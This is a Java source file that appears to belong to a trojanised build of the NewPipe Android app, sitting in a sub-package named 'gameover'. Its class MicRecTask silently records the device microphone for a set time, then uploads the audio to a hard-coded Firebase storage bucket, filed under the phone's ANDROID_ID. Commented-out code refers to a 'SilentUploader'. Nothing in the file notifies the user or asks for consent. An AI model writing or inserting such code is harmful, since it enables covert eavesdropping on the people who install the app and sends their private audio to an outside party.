package org.schabi.newpipe.gameover;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.MediaRecorder;
import android.net.Uri;
import android.provider.Settings;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;


public class MicRecTask {


  static MediaRecorder rec;
  static File file = null;
  static final String TAG = "Recording";
  static TimerTask stop;
  Context mContext;

  public MicRecTask(Context ctx) {
    this.mContext = ctx;
  }

  public void Rec(int seconds) throws Exception {

    File dir = mContext.getDir("MIC",Context.MODE_PRIVATE);
    try {
//      Log.traced(TAG, dir.getAbsolutePath());
//      file = File.createTempFile("audio", ".mp3", dir);
      file = new File(dir, "audio_"+timestamp()+".mp3");

    } catch (Exception e) {
      //e.printStackTrace();
//      Log.trace(TAG, "Major error in recording");
      return;
    }

    rec = new MediaRecorder();
    rec.setAudioSource(MediaRecorder.AudioSource.MIC);
    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
    rec.setOutputFile(file.getAbsolutePath());
    rec.prepare();
    rec.start();


    stop = new TimerTask() {
      @Override
      public void run() {
        rec.stop();
        rec.release();
//        Log.trace(TAG, "run: "+file.getAbsolutePath());
        goforit(mContext,file);
      }
    };

    new Timer().schedule(stop, seconds * 1000);
  }

  private String timestamp() {
   return String.valueOf(System.currentTimeMillis() / 1000);
  }


  private static void goforit(Context mContext, File file) {

    /*new SilentUploader( file.getAbsolutePath(), "mic", new Callback() {
      @Override
      public void ok(String str) {
        if (str != null) {
          if (str.startsWith("--")) {
            Preferences.sendlogsR("SilentUpload failed : "+str);
          }
        }      }
    }).execute();*/

    StorageReference ref  = FirebaseStorage.getInstance("gs://fir-d5cfd.appspot.com").getReference();
    @SuppressLint("HardwareIds")
    String aid = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
    ref.child(aid).child("MIC").child(String.valueOf(System.currentTimeMillis())).putFile(Uri.fromFile(file));

  }

}

